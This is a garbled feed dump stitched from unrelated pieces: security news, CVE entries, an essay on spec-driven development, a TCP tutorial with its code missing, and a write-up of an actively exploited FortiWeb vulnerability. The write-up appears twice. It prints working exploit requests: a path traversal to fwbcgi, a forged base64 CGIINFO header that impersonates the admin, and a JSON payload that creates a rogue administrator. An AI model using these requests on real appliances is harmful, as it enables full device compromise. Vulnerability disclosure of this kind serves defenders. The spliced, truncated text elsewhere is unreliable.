4. Any person who presents content or activity to the persons referred to in paragraph 2 as being illegal with the aim of having it removed or its dissemination stopped, when they know this information to be inaccurate, shall be punished by one year’s imprisonment and a fine of €15,000.We believe there are indications of criminal behavior here that should be investigated by law enforcement. Therefore, we will file an official complaint with the French police, including all relevant details.All this is unfolding amid reports of an FBI investigation into the owner of Archive.today. It seems that this investigation may be related to CSAM hosting. While we can’t confirm any connection between that case and ours, the timing is certainly suspicious.]]></content:encoded></item><item><title>Five Plead Guilty in U.S. for Helping North Korean IT Workers Infiltrate 136 Companies</title><link>https://thehackernews.com/2025/11/five-us-citizens-plead-guilty-to.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjiZLSJZYH44phyXKQDmoGmkWealYMHJ_c95Ee6EYNEGqEKPn249Xacy2yylC7XobIDqYHHJNGtBy5zTs2R_XCq6Y0kKqlfYOk4rUrMR99N1NdsOcB1prH_8KEnZr7ywk-R03KJ5sDGzKv9Wx-ICZWlU4jSLvBOpxsi_Ckv5lZBh2n_2ASjVfD8yqueEEWn/s1600/north-hackers.jpg" length="" type=""/><pubDate>Sat, 15 Nov 2025 10:21:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The U.S. Department of Justice (DoJ) on Friday announced that five individuals have pleaded guilty to assisting North Korea's illicit revenue generation schemes by enabling information technology (IT) worker fraud in violation of international sanctions.

While it promises structure for AI-driven programming, it risks burying agility under layers of Markdown. This post explores why a more iterative, natural-language approach may better fit modern development.Coding assistants are intimidating: instead of an IDE full of familiar menus and buttons, developers are left with a simple chat input. How can we ensure that the code is correct with so little guidance?To help people write good software with coding assistants, the open-source community designed a clever way to guide a coding agent. Based on an initial prompt and a few instructions, an LLM generates product specifications, an implementation plan, and a detailed list of tasks. Each document depends on the previous one, and users can edit the documents to refine the spec.Eventually, these documents are handed over to a coding agent (Claude Code, Cursor, Copilot, you name it). The agent, now properly guided, should write solid code that satisfies the business requirements.This approach is called Spec-Driven Development (SDD), and several toolkits can get you started. To name a few:How does a spec look? It’s essentially a bunch of Markdown files. Here’s an example using GitHub’s spec-kit, where a developer wanted to display the current date on a time-tracking app, resulting in 8 files and 1,300 lines of text:Here’s another example using Kiro for a small feature (adding a “referred by” field to contacts in Atomic CRM):At first glance, these documents look relevant. But the devil is in the details. Once you start using SDD, a few shortcomings become clear:: Like coding agents, SDD agents discover context via text search and file navigation. They often miss existing functions that need updates, so reviews by functional and technical experts are still required.: SDD produces too much text, especially in the design phase. Developers spend most of their time reading long Markdown files, hunting for basic mistakes hidden in overly verbose, expert-sounding prose. It’s exhausting.: The three-step design process is excessive for most cases. Specs contain many repetitions, imaginary corner cases, and overkill refinements. It feels like they were written by a picky clerk.: SDD toolkits generate what they call “User Stories,” but they often misuse the term (e.g. “As a system administrator, I want the referred by relationship to be stored in the database” is not a user story). It doesn’t cause bugs but it’s distracting.: The technical specification already contains code. Developers must review this code before running it, and since there will still be bugs, they’ll need to review the final implementation too. As a result, review time doubles.: The SDD methodology is meant to keep the coding agent on track, but in practice, agents don’t always follow the spec. In the example above, the agent marked the “verify implementation” task as done without writing a single unit test—it wrote manual testing instructions instead.: SDD shines when starting a new project from scratch, but as the application grows, the specs miss the point more often and slow development. For large existing codebases, SDD is mostly unusable.Most coding agents already have a plan mode and a task list. In most cases, SDD adds little benefit. Sometimes, it even increases the cost of feature development.To be fair, SDD helps agents stay on task and occasionally spots corner cases developers might miss. But the trade-off (spending 80% of your time reading instead of thinking) is, in my opinion, not worth it.Maybe SDD doesn’t help much today because the toolkits are still young and the document prompts need refinement. If that’s the case, we just need to wait a few months until they improve.But my personal opinion is that SDD is a step in the wrong direction. It tries to solve a faulty challenge:“How do we remove developers from software development?”It does so by replacing developers with coding agents and guarding those agents with meticulous planning.In that sense, SDD reminds me of the Waterfall model, which required massive documentation before coding so that developers could simply translate specifications into code.But developers haven’t been mere executors for a long time, and Big Design Up Front has proven to fail most of the time because it piles up hypotheses. Software development is fundamentally a non-deterministic process, so planning doesn’t eliminate uncertainty (see the classic No Silver Bullet paper).Also, who is SDD really for? You must be a  to catch errors during the requirements phase, and a  to catch errors during design. As such, it doesn’t solve the problem it claims to address (removing developers), and it can only be used by the rare individuals who master both trades. SDD repeats the same mistake as No Code tools, which promise a “no developer” experience but actually require developers to use them.Agile methodologies solved the problem of non-deterministic development by trading predictability for adaptability. I believe they show us a path where coding agents can help us build reliable software, without drowning in Markdown.Give a coding agent a simple enough problem, and it won’t go off the rails. Instead of translating complex requirements into complex design documents, we should split complex requirements into multiple simple ones.I’ve successfully used coding agents to build fairly complex software without ever looking at the code, by following a simple approach inspired by the Lean Startup methodology:Identify the next most risky assumption in the product.Design the simplest experiment to test it.Develop that experiment. If it fails, go back to #2. Otherwise, repeat starting from #1.I . I just added small features one by one, correcting the software when the agent misunderstood me or when my own idea didn’t work well. You can see my instructions in the coding session logs: they’re often short and vague, and sometimes lead to dead ends, but that’s fine. When implementing simple ideas is cheap, building in small increments is the fastest way to converge toward a good product.Agile methodologies freed us from the bureaucracy of waterfall. They showed that close collaboration between product managers and developers eliminates the need for design documents. Coding agents supercharge Agile, because we can literally write the product backlog and see it being built in real time—no mockups needed!This approach has one drawback compared to Spec-Driven Development: it doesn’t have a name. “Vibe coding” sounds dismissive, so let’s call it Natural Language Development.I do have one frustration, though: coding agents use text, not visuals. Sometimes I want to point to a specific zone, but browser automation tools aren’t good enough (I’m looking at you, Playwright MCP Server). So if we need new tools to make coding agents more powerful, I think the focus should be on richer visual interactions.Agile methodologies killed the specification document long ago. Do we really need to bring it back from the dead?Spec-Driven Development seems born from the minds of CS graduates who know their project management textbooks by heart and dream of removing developers from the loop. I think it’s a missed opportunity to use coding agents to empower a new breed of developers, those who use natural language and build software iteratively.Let me end with an analogy: coding agents are like the invention of the combustion engine. Spec-Driven Development keeps them confined to locomotives, when we should be building cars, planes, and everything in between. Oh, and just like combustion engines, we should use coding agents sparingly if we care about the environment.]]></content:encoded></item><item><title>Messing with scraper bots</title><link>https://herman.bearblog.dev/messing-with-bots/</link><author>HermanMartinus</author><category>dev</category><pubDate>Sat, 15 Nov 2025 07:38:18 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CVE-2025-13190 - D-Link DIR-816L __ajax_exporer.sgi scandir_main stack-based overflow</title><link>https://cvefeed.io/vuln/detail/CVE-2025-13190</link><author></author><category>vulns</category><pubDate>Sat, 15 Nov 2025 07:15:46 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-13190

It’s nearly impossible to keep people away from. But it can also be unreliable: packets drop, links congest, bits mangle, and data corrupts. Oh, it’s dangerous out there! (I’m writing this in Kramer’s tone)So how is it possible that our apps just work? If you’ve networked your app before, you know the drill: / here,  there, maybe a  over there, and it just works. Reliable, orderly, uncorrupted data flows to and fro.Websites (HTTP), email (SMTP) or remote access (SSH) are all built on top of TCP and just work.Why do we need TCP? Why can’t we just use the layer below, IP?Remember, the network stack goes: Physical –> Data Link (Ethernet/Wi-Fi, etc) –> Network (IP) –> Transport (TCP/UDP).IP (Layer 3) operates at the host level, while the transport layer (TCP/UDP) works at the application level using ports. IP can deliver packets to the correct host via its IP address, but once the data reaches the machine, it still needs to be handed off to the correct process. Each process “binds” to a port: its address within the machine. A common analogy is: the IP address is the building, and the port is the apartment. Processes or apps live in those apartments.Another reason we need TCP is that if a router (a piece of infra your average user does not control) drops packets or becomes overloaded, TCP at the edges (on the users’ machines) can recover without requiring routers to participate. The routers stay simple, the reliability happens at the endpoints.Packets get lost, corrupted, duplicated, and reordered. That’s just how the internet works. TCP shields developers from these issues. It handles retransmission, checksums, and a gazillion other reliability mechanisms. If every developer had to implement those themselves, they’d never have time to properly align their flexboxes, a truly horrendous alternate universe.Jokes aside, the guarantee that data sent and received over a socket isn’t corrupted, duplicated, or out of order, despite the underlying network being unreliable, is exactly why TCP is awesome.When you step back and think about network communication, here’s what we’re really trying to do: machine A sends data to machine B. Machine B has a finite amount of space and must store the incoming data somewhere before passing it to the application, which might be asleep or busy. This temporary storage takes the name of a  and is managed by the kernel: => net.ipv4.tcp_rmem = 4096 131072 6291456, a min of 4k, default of 128k and max of 8M.The problem is that space is finite. If you’re transferring a large file (hundreds of MBs or even GBs), you could easily overwhelm the destination. The receiver therefore needs a way to tell the sender how much more data it can handle. This mechanism is called , and TCP segments include a field called the , which specifies how much data the receiver is currently willing to accept.Another issue is overwhelming the network itself, even if the receiving machine has plenty of buffer space. You’re only as strong as your weakest link: some links carry gigabits, others only megabits. If you don’t tune for the slowest link, congestion is inevitable.Fun fact: in 1986, the Internet’s bandwidth dropped from a few dozen KB/s to as low as  (yes, bits per second! yes, those numbers are wild!), in what became known as . When packets were lost and systems retried sending them, they made congestion even worse: a doom loop. To fix this, TCP incorporated ‘play nice’ and ‘back off’ behaviors known as , which help prevent the Internet from clogging itself to death.With all low-level things like TCP, C examples are the way to go. Just show it like it is.1

This create a TCP server that echoes what the client sends prefixed with ‘You sent:’.
gcc  server server.c   ./server

telnet 127.0.0.1 8080
 (localhost) could be replace with a remote IP and it should work all the same.We used the following primitives/functions follow the Berkley Socket way of doing things (released with BDS 4.2):: create an endpoint (structure in the kernel).: associate to a port.: get ready to accept connection and a specify queue size of pending connection (beyond that size, drop!): accept an incoming connection (TCP Server): attempt connection (TCP client): release the connectionIn the example above, we’re using client/server dynamics in a request/response pattern. But I can add the following after :Compile, run, and telnet:client here
you sent: client here
client again
not a response, just doing my thing
you sent: client again
I typed in the telnet terminal: , then . I only got , then the server was sleeping. My second line, , was patiently waiting in the receive buffer. The server sent not a response, just doing my thing, then picked up my second TCP packet and replied with .This is very much a duplex bidirectional link. Each side sends what it wishes, it just happens that at the beginning, one listens and the other connects. The dynamics afterwards don’t have to follow a request/response pattern.Let’s create a very simple HTTP/1.1 server (later versions are trickier).1

Each TCP segment has the header above. And each TCP segment is contained within a IP packet. We have a source and destination ports. Each 16 bits, and that’s where the 64k port limit comes from!Each transport-layer connection is 5-tuple (TCP/UDP, src IP, src port, dst IP, dst port).TCP reliability depends on two key fields: the , indicating which bytes a segment carries, and the , indicating which bytes have been received. Sequence numbers let the receiver interpret data order, detect and reorder out-of-order segments, and identify losses. TCP uses cumulative acknowledgments—an ACK of 100 means bytes 0-99 were received. If bytes 100-120 are lost but later bytes arrive, the ACK remains 100 until the missing data is received.1

Header Length shows how many 4-byte words are in the header, needed because the Options field is variable length, and thus so is the header.Next are 8 flags (1 bit each). A few important ones:: used to establish a connection. : indicates the Acknowledgment number is valid.These two flags are central to connection setup. Why establish a connection? To detect out-of-order or duplicate segments you must track what has been sent and received i.e., maintain a state or a connection. and  participate in the famous 3-way handshake:A –> B:  (I want to connect)B –> A:  +  (I got your SYN, I want to connect too!)A –> B:  (got it, connection established!)The  flag signals teardown and also uses a handshake:X –> Y:  (I want to disconnect)Y –> X:  (got your FIN, whatever!)Y –> X:  (I want to disconnect too - sometimes sent with the previous ACK)This is normally a 4-way (sometimes 3-way) goodbye handshake. is the reset flag. It indicates an error or forced shutdown — drop the connection immediately. An OS sends  if no process is listening or if the listening process crashed. There’s also a known TCP reset attack where intermediaries inject  to terminate connections (used by some firewalls).We talked about this field in flow control. As mentionned above, this indicates how many bytes the receiver is willing to receive after the acknowledged number.With the example above, running  (Socket Statistics) provides info about the TCP connection.ss 
// State    Recv-Q   Send-Q       Local Address:Port           Peer Address:Port   Process    
// LISTEN   0        5                  0.0.0.0:http-alt            0.0.0.0::,pid1113,fd3
// 	 skmem:r0,rb131072,t0,tb16384,f0,w0,o0,bl0,d0 cubic cwnd:10
 (128KB) is the receive buffer size, while  (16KB) is the transmit buffer size, where data waits before being sent over the network.  indicates bytes not yet acknowledged by the remote host, and  shows bytes received but not yet read by the application (e.g., data waiting in from the second line in telnet session above, while the server was sleeping).Checksum is used for reliability. All 16-bit words in the TCP segment are added together, and the result is compared to the checksum. If they don’t match, it means some bits were likely corrupted, and retransmission is needed.It always amazes me how all this works. The network, the internet. Reliably and continuously. Just a few decades ago, sending a few KB was quite the feat. And today, streaming 4k is banal. God bless all those hardworking people that made and make it all possible!]]></content:encoded></item><item><title>CVE-2025-13189 - D-Link DIR-816L gena.cgi genacgi_main stack-based overflow</title><link>https://cvefeed.io/vuln/detail/CVE-2025-13189</link><author></author><category>vulns</category><pubDate>Sat, 15 Nov 2025 06:15:43 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-13189

Netis ADSL Router DL4322D firmware RTK 2.1.1 contains a buffer overflow vulnerability in the embedded FTP service that allows an authenticated remote user to trigger a denial of service. After logging in to the FTP service, sending an FTP command such as ABOR with an excessively long argument causes the service, and in practice the router, to crash or become unresponsive, resulting in a loss of availability for the device and connected users.

 Nov. 14, 2025, 7:16 p.m. | 2 days, 21 hours ago
Nero BackItUp in the Nero Productline is vulnerable to a path parsing/UI rendering flaw (CWE-22) that, in combination with Windows ShellExecuteW fallback extension resolution, leads to arbitrary code execution when a user clicks a crafted entry. By creating a trailing-dot folder and placing a same-basename script, Nero BackItUp renders the file as a folder icon and then invokes ShellExecuteW, which executes the script via PATHEXT fallback (.COM/.EXE/.BAT/.CMD). The issue affects recent Nero BackItUp product lines (2019-2025 and earlier) and has been acknowledged by the vendor.

I look forward to speaking with you soon.I edited out the company name and the name of the supposed recruiter, but when we Googled that alleged recruiter’s name, he does work at the impersonated company (just not in HR). That’s not unique, though. We’ve heard several variants of very similar stories involving other companies and other names.Other red flags included the fact that the email came from a Gmail address (not a company domain), and that the company has no openings for a Senior Construction Manager.When our target replied they were looking forward to the interview, they received the “Meeting invitation” by email:      {recruiter} INVITED YOU TO A ZOOM REMOTE MEETINGPlease click the button below to view the invitation within 30 days.

It’s associated with LogMeIn Resolve, a remote support tool, which attackers can fake or misuse to execute ransomware payloads once installed.This tactic is part of a broader trend where attackers pose as recruiters or trusted contacts, inviting targets to meetings and requiring them to install software updates to participate. Those updates, however, can be malware installers or Remote Monitoring and Management (RMM) tools which can give attackers direct access to your device.This type of attack is a prime example of how social engineering is becoming the primary way to gain initial access to you or your company’s system.The best way to stay safe is to be able to recognize attacks like these, but there are some other things you can do.Always keep your operating system, software, and security tools updated regularly with the latest patches to close vulnerabilities.Be extremely cautious with unsolicited communications, especially those inviting you to meetings or requesting software installs or updates; verify the sender and context independently.Avoid clicking on links or downloading attachments from unknown or unexpected sources.

While many may have dismissed it as Internet junk, it wasn’t - it was evidence of a threat actor looking to exploit a vulnerability (currently unnamed and without ID) that allowed privileged administrative functions to be reached.In the example above, the threat actor exploited the vulnerability to add administrative accounts to the target and vulnerable appliance, serving as a weak persistence mechanism. To be explicitly clear, this is a complete compromise of the vulnerable appliance.The vulnerability itself? As far as we can see, it’s actually two..A Path Traversal vulnerability that we can see within the URIAn Authentication Bypass vulnerability (via the contents of the HTTP request header  )This question has been screamed at us for the last 24 hours.While patch notes for FortiWeb 8.0.2 don’t include a reference or mention of any resolved vulnerabilities, the results from our internal testing labs show that 8.0.2 is mysteriously patched for this mysterious vulnerability:Did Fortinet stumble, silently, into patching a vulnerability? Only Fortinet knows, really.The following versions are known to be affected (thanks to Orange Cyberdefense for sharing information with us):The First Step - The Path TraversalThe first stage of our vulnerability begins with leveraging a path traversal.GET /api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi HTTP/1.1
Host: 192.168.9.1
Connection: keep-alive

As you can see, this is fairly ‘simple’ - if the URI begins with a valid FortiWeb API path, an attacker is then able to traverse to another CGI executable.Which CGI executable? Well, there is only one -  - so the choice is fairly simple.The following method can be used to quickly check whether your FortiWeb version is affected by this vulnerability.If the request returns HTTP 200, the vulnerability is present.If the request returns HTTP 403, the vulnerability has been patched.Let’s very briefly explain how the  binary works. For context, the main function provided by  follows this structure:int __fastcall main(int argc, const char **argv, const char **envp)
{
  [..SNIP..]

  cgi_init(v3);
  while ( !access("/var/log/debug_cgi", 0) )
    sleep(1u);
  if ( (unsigned int)cgi_inputcheck((__int64)v4) || (gui_conf_init(), cli_init(), (unsigned int)cgi_auth(v4)) )
  {
    cgi_output(v4);
  }
  else
  {
    cgi_process(v4);
    cgi_output(v4);
    conf_end();
  }
  cgi_free(v4);
  return 0;
}
Our goal is to reach the  function, which contains all the backend functionality we need access to. However, two validation functions stand between us and this objective:Both checks must pass (return 0) for execution to proceed to .Step Two (a) - cgi_inputcheck()In reality,  is very simple.The  routine is designed to perform a very lightweight validation of the incoming HTTP body. In practice, its role is limited to confirming that the content is a valid JSON blob.The relevant portion of the function looks like this:__int64 __fastcall cgi_inputcheck(__int64 a1)
{
  [..SNIP..]
  
  v1 = (char *)cat_cgi_paths();
  snprintf(s, 0x100uLL, "%s%s%s", "/var/log/inputcheck/", v1, ".json");
  free(v1);
  v2 = fopen(s, "r");
  if ( !v2 )
    return 0LL;  // File doesn't exist - check passes
    
  [..SNIP..]
  
  v10 = json_tokener_parse((__int64)v8);
  if ( !v10 )
  {
    // JSON parsing failed - check fails
    return 0LL;
  }
  [..SNIP..]
}
The logic here is remarkably permissive:If the associated  file does  exist (the default case), the function immediately returns  - validation passed.If the file  exist, the only requirement is that the body can be parsed as valid JSON.As a result, any valid JSON object satisfies this check, including the simplest possible JSON payload:Step Two (b) - Impersonating Users Via This is where things become significantly more interesting.While you might expect  to authenticate the caller, that is  what it does. Instead, the function effectively provides a mechanism to  based on data supplied by the client. The behaviour unfolds in several steps:At , the function extracts a  header from the HTTP request.At , the value is Base64-decoded.At , the result is parsed as JSON.At , the function iterates through all JSON keys and extracts several user-related attributes: > target username > login identifierThese fields are used to tell  which user the HTTP request sender wishes to impersonate.Notably, the built-in  account on FortiWeb appliances has a consistent set of attributes across devices - and these attributes cannot be modified.The relevant portion of the function looks like this:__int64 __fastcall cgi_auth(_QWORD *a1)
{
  [..SNIP..]
  
  v2 = getenv("HTTP_CGIINFO");
  if ( !v2 )
  {
    message("%s:%d: not include cgi info header\\n", s);
    return 0xFFFFFFFFLL;
  }
  
  // Decode base64 HTTP_CGIINFO header
  cmDecodeB64(v19, 512LL, v2, 0xFFFFFFFFLL); // [2]
  v3 = json_tokener_parse(v19); // [3]
  
  [..SNIP..]

Auth. Bypass)

The Internet is ablaze, and once again we all have a front-row seat - a bad person, if you can believe it, is doing a bad thing!

The first warning of such behaviour came from the great team at Defused:

As many are now aware, an unnamed (and potentially silently fixed) vulnerability affecting a number of Forti-devices (blast radius is currently unclear) is being actively exploited. For many, this will feel like a normal Tuesday.

For others, it will feel like a Monday.

Moments like this are why we exist. As soon as we identified the activity, the watchTowr team moved quickly, spinning up our rapid reaction process to support clients as the threat emerged.

### The Vulnerability

Fortinet system administrators staring inquisitively at packet captures (as you generally have to do as an administrator of any security appliance), may have seen the following request stream pass them in the past weeks:

```
POST /api/v2.0/cmd/system/admin%3F/../.. ../../../cgi-bin/fwbcgi HTTP/1.1 Host: [redacted] User-Agent: python-urllib3/2.2.3 Accept-Encoding: identity CGIINFO: eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb201OiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ== Content-Length: 835 Content-Type: application/json { "data": { "q_type": 1, "name": "Testpoint", "access-profile": "prof_admin", "access-profile_val": "0", "trusthostv4": "0.0.0.0/0 ", "trusthostv6": "::/0 ", "last-name": "", "first-name": "", "email-address": "", "phone-number": "", "mobile-number": "", "hidden": 0, "domains": "root", "sz_dashboard": -1, "type": "local-user", "type_val": "0", "admin-usergrp_val": "0", "wildcard_val": "0", "accprofile-override_val": "0", "sshkey": "", "passwd-set-time": 0, "history-password-pos": 0, "history-password0": "", "history-password1": "", "history-password2": "", "history-password3": "", "history-password4": "", "history-password5": "", "history-password6": "", "history-password7": "", "history-password8": "", "history-password9": "", "force-password-change": "disable", "force-password-change_val": "0", "password": "AFodIUU3Sszp5" }}
```

While many may have dismissed it as Internet junk, it wasn’t - it was evidence of a threat actor looking to exploit a vulnerability (currently unnamed and without ID) that allowed privileged administrative functions to be reached.

In the example above, the threat actor exploited the vulnerability to add administrative accounts to the target and vulnerable appliance, serving as a weak persistence mechanism.

To be explicitly clear, this is a complete compromise of the vulnerable appliance.

The vulnerability itself? As far as we can see, it’s actually two..

- A Path Traversal vulnerability that we can see within the URI
- An Authentication Bypass vulnerability (via the contents of the HTTP request header `CGIINFO`)

### Is Fortinet Aware?

This question has been screamed at us for the last 24 hours.

While patch notes for FortiWeb 8.0.2 don’t include a reference or mention of any resolved vulnerabilities, the results from our internal testing labs show that 8.0.2 is mysteriously patched for this mysterious vulnerability:

Did Fortinet stumble, silently, into patching a vulnerability? Only Fortinet knows, really.

The following versions are known to be affected (thanks to Orange Cyberdefence for sharing some of these versions with us):

- 8.0: <8.0.2
- 7.6: <7.6.5
- 7.4: <7.4.10
- 7.2: <7.2.12
- 7.0: <7.0.12
- 6.4: <= 6.4.3
- 6.3: <= 6.3.23

### The First Step - The Path Traversal

The first stage of our vulnerability begins with leveraging a path traversal.

```
GET /api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi HTTP/1.1 Host: 192.168.9.1 Connection: keep-alive
```

As you can see, this is fairly ‘simple’ - if the URI begins with a valid FortiWeb API path, an attacker is then able to traverse to another CGI executable. followed by a path-traversal sequence attempting to reach another CGI executable.

Which CGI executable? Well, there is only one - `fwbcgi` \- so the choice is fairly simple.

The following method can be used to quickly check whether your FortiWeb version is affected by this vulnerability.

- If the request returns HTTP 200, the vulnerability is present.
- If the request returns HTTP 403, the vulnerability has been patched.

### Step Two - FWBCGI

Let’s very briefly explain how the `fwbcgi` binary works. For context, the main function provided by `fwbcgi` follows this structure:

```
int __fastcall main(int argc, const char **argv, const char **envp) { [..SNIP..] cgi_init(v3); while ( !access("/var/log/debug_cgi", 0) ) sleep(1u); if ( (unsigned int)cgi_inputcheck((__int64)v4) || (gui_conf_init(), cli_init(), (unsigned int)cgi_auth(v4)) ) { cgi_output(v4); } else { cgi_process(v4); cgi_output(v4); conf_end(); } cgi_free(v4); return 0; }
```

Our goal is to reach the `cgi_process()` function, which contains all the backend functionality we need access to. However, two validation functions stand between us and this objective:

1. `cgi_inputcheck()`
2. `cgi_auth()`

Both checks must pass (return 0) for execution to proceed to `cgi_process()`.

### Step Two (a) - cgi\_inputcheck()

In reality, `cgi_inputcheck()` is very simple.

The `cgi_inputcheck()` routine is designed to perform a very lightweight validation of the incoming HTTP body. In practice, its role is limited to confirming that the content is a valid JSON blob.

The relevant portion of the function looks like this:

```
__int64 __fastcall cgi_inputcheck(__int64 a1) { [..SNIP..] v1 = (char *)cat_cgi_paths(); snprintf(s, 0x100uLL, "%s%s%s", "/var/log/inputcheck/", v1, ".json"); free(v1); v2 = fopen(s, "r"); if ( !v2 ) return 0LL; // File doesn't exist - check passes [..SNIP..] v10 = json_tokener_parse((__int64)v8); if ( !v10 ) { // JSON parsing failed - check fails return 0LL; } [..SNIP..] }
```

The logic here is remarkably permissive:

- If the associated `inputcheck` file does **not** exist (the default case), the function immediately returns `0`\- validation passed.
- If the file **does** exist, the only requirement is that the body can be parsed as valid JSON.

As a result, any valid JSON object satisfies this check, including the simplest possible JSON payload:

```
{}
```

Let’s move on…

### Step Two (b) - Impersonating Users Via `cgi_auth()`

This is where things become significantly more interesting.

While you might expect `cgi_auth()` to authenticate the caller, that is _not_ what it does. Instead, the function effectively provides a mechanism to **impersonate any user** based on data supplied by the client. The behaviour unfolds in several steps:

1. At **\[1\]**, the function extracts a `CGIINFO` header from the HTTP request.
2. At **\[2\]**, the value is Base64-decoded.
3. At **\[3\]**, the result is parsed as JSON.
4. At **\[4\]**, the function iterates through all JSON keys and extracts several user-related attributes:
   - `username` \> target username
   - `profname` \> profile name
   - `vdom` \> virtual domain
   - `loginname` \> login identifier

These fields are used to tell `fwbcgi` which user the HTTP request sender wishes to impersonate.

Notably, the built-in `admin` account on FortiWeb appliances has a consistent set of attributes across devices - and these attributes cannot be modified.

The relevant portion of the function looks like this:

```
__int64 __fastcall cgi_auth(_QWORD *a1) { [..SNIP..] v2 = getenv("HTTP_CGIINFO"); if ( !v2 ) { message("%s:%d: not include cgi info header\\n", s); return 0xFFFFFFFFLL; } // Decode base64 HTTP_CGIINFO header cmDecodeB64(v19, 512LL, v2, 0xFFFFFFFFLL); // [2] v3 = json_tokener_parse(v19); // [3] [..SNIP..] // Extract user attributes from the decoded JSON // [4] for ( i = *(_QWORD *)(json_object_get_object(v3) + 8); i; i = *(_QWORD *)(i + 24) ) { v5 = *(const char **)i; string = (const char *)json_object_get_string(*(_QWORD *)(i + 16)); if ( !strncmp(v5, "username", 8uLL) ) a1[682] = strdup(string); else if ( !strncmp(v5, "profname", 8uLL) ) a1[683] = strdup(string); else if ( !strncmp(v5, "vdom", 4uLL) ) a1[684] = strdup(string); else if ( !strncmp(v5, "loginname", 9uLL) ) a1[685] = strdup(string); // ... additional fields } // Set login context with extracted credentials // [5] set_login_context_vsa(a1[685], a1[682], v19, a1[683], v8, 0LL); domain_id = cmf_shm_find_domain_id((void *)a1[684]); cmf_set_cur_domain_id(domain_id); return 0LL; }
```

Once all fields are extracted, the call at **\[5\]** \- `set_login_context_vsa()` \- applies the impersonation context.

From this point onward, all actions executed within `cgi_process()` are performed as the impersonated user.

In other words - by supplying a handcrafted `HTTP_CGIINFO` header, an attacker can impersonate any user, including the built-in admin, and inherit their full privileges.

Beautiful.

### Exploiting the Vulnerability

With both validation checks out of the way, exploitation becomes remarkably straightforward. To assume administrative privileges, we can follow the following flow:

1. Create a JSON object with built-in `admin` credentials:

```
{ "username": "admin", "profname": "super_admin", "vdom": "root", "loginname": "admin" }
```

1. Base64-encode this JSON
2. Send it in the `HTTP_CGIINFO` header

Once processed by `cgi_auth()`, the vulnerable appliance will happily impersonate the supplied user and treat the request as authenticated with full administrative rights.

From this point on, all execution flows into `cgi_process()`, which is the heart of the backend logic. That means an attacker can perform any privileged action simply by supplying the appropriate JSON structure.

For example, the following payload instructs the appliance to create a new local user named `watchTowr` with the password `watchTowr` and administrative privileges ( `prof_admin`):

```
{"data":{"name":"watchTowr","access-profile":"prof_admin","access-profile_val":"0","trusthostv4":"0.0.0.0/0","trusthostv6":"::/0","last-name":"","first-name":"","email-address":"","phone-number":"","mobile-number":"","hidden":0,"comments":"","sz_dashboard":-1,"type":"local-user","type_val":"0","admin-usergrp_val":"0","wildcard_val":"0","accprofile-override_val":"0","sshkey":"","passwd-set-time":0,"history-password-pos":0,"history-password0":"","history-password1":"","history-password2":"","history-password3":"","history-password4":"","history-password5":"","history-password6":"","history-password7":"","history-password8":"","history-password9":"","force-password-change":"disable","force-password-change_val":"0","password":"watchTowr"}}
```

FBI investigators traced Volkov through iCloud, cryptocurrency records, and social media, recovering chat logs, stolen credentials, and evidence of ransom negotiations, which all linked him to $1.5 million in collected payments.His breaches affected companies across multiple states, including banks, engineering firms, and telecoms. Volkov faces up to 53 years in prison and over $9.1 million in restitution for charges including trafficking in access, identity theft, computer fraud, and money laundering., an international effort against cybercrime. Coordinated by Europol and Eurojust with support from private partners, the action consisted of searches at 11 locations in Germany, Greece, and the Netherlands, where officers seized 20 domains and arrested a key VenomRAT suspect. The disrupted infrastructure involved hundreds of thousands of infected devices and millions of stolen credentials, including access to over 100,000 crypto wallets.

The vulnerability, tracked as CVE-2025-12480, allows attackers to abuse an access control logic error that grants admin privileges when the request host equals ‘localhost’. By spoofing this value in the HTTP host header, an attacker can reach sensitive setup pages without credentials, especially on systems where the  parameter was never configured.Security researchers first discovered an intrusion in August targeting a Triofox instance running version 16.4.10317.56372. They later determined that the threat cluster UNC6485 used a malicious HTTP GET request containing a localhost header to access the  setup page. Using this workflow, the attackers created a rogue administrator account called ‘Cluster Admin’, uploaded a malicious script, and configured Triofox to treat that script as the antivirus scanner path. .The payload then launches a PowerShell downloader to retrieve a Zoho UEMS installer, which subsequently deploys Zoho Assist and AnyDesk on the compromised host for remote access and lateral movement. The attackers were also observed using Plink and PuTTY to establish SSH tunnels and forward traffic to the compromised host’s RDP port.Gladinet has since fixed CVE-2025-12480 in Triofox version 16.7.10368.56560, and administrators are urged to update to the latest release (16.10.10408.56683), review admin accounts, and ensure the antivirus engine is not configured to run unauthorized binaries.The Ugly | Attackers Exploit Zero-Day to Steal Washington Post Employee DataThe Washington Post, one of the vendors impacted by a breach targeting Oracle software,  in the data theft campaign. The Post, one of the largest U.S. newspapers with 2.5 million digital subscribers, confirmed that attackers accessed parts of its network between July 10 and August 22 by exploiting a previously unknown zero-day vulnerability in Oracle E-Business Suite, the organization’s internal enterprise resource planning (ERP) system. The vulnerability is tracked as CVE-2025-61884.According to the letter sent to affected individuals, the Post learned of the intrusion after a threat actor contacted the company on September 29 claiming access to its Oracle applications. Post-breach investigations identified the widespread flaw that allowed the attackers to access many Oracle customers’ applications. The attackers used this flaw to steal sensitive data and later attempted to extort the Post and other organizations breached in the same campaign.Although the Post did not name the group responsible, The Post’s investigation has determined that data belonging to 9,720 individuals was compromised.

